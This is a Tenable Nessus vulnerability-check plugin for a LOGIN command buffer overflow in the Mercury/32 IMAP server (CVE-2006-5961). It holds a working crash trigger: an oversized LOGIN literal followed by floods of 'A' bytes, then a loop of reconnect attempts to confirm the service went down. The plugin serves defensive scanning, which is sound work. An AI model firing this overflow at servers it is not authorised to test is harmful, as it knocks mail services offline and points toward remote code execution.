#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24785);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-5961");
  script_bugtraq_id(21110);
  script_osvdb_id(30395);
  script_xref(name:"EDB-ID", value:"3418");

  script_name(english:"Mercury IMAP Server LOGIN Command Remote Overflow");
  script_summary(english:"Checks for a buffer overflow vulnerability in Mercury IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Mercury Mail Transport System, a free
suite of server products for Windows and NetWare associated with
Pegasus Mail. 

The remote installation of Mercury Mail includes an IMAP server that
is affected by a buffer overflow flaw.  Using a specially crafted
LOGIN command, an unauthenticated, remote attacker can leverage this
issue to crash the remote application and even execute arbitrary code
remotely, subject to the privileges under which the application runs." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/03/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/14");
 script_cvs_date("$Date: 2011/09/22 20:09:24 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");

  script_dependencies("imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("imap_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
if (get_kb_item("imap/"+port+"/false_imap")
 || get_kb_item("imap/"+port+"/overflow")) exit(0);


# Make sure it's a potentially-affected version of Mercury Mail.
banner = get_imap_banner(port:port);
if (banner && "IMAP4rev1 Mercury/32" >< banner) 
{
  # Try to crash the service.
  soc = open_sock_tcp(port);
  if (soc)
  {
    # Read banner.
    s = recv_line(socket:soc, length:1024);
    if (!strlen(s))
    {
      close(soc);
      exit(0);
    }

    # Send the exploit.
    ++tag;
    resp = NULL;
    c = string("1 LOGIN", crap(data:" ", length:9200-8192), "{255}");
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);
    if ("+ Ready for 255" >< s)
    {
      # nb: payload.
      c = crap(data:"A", length:255);
      send(socket:soc, data:c);

      # nb: payload #2.
      c = crap(data:"A", length:8192);
      send(socket:soc, data:c);

      # nb: connection stays open until we close our connection.
      close(soc);

      # Try to reconnect a couple of times.
      failed = 0;
      tries = 5;
      for (iter=0; iter<=tries; iter++)
      {
        soc = open_sock_tcp(port);
        if (soc)
        {
          failed = 0;
          close(soc);
          sleep(1);
        }
        else
        {
          failed++;
          if (failed > 1)
          {
            security_hole(port);
            exit(0);
          }
        }
      }
    }
  }
}
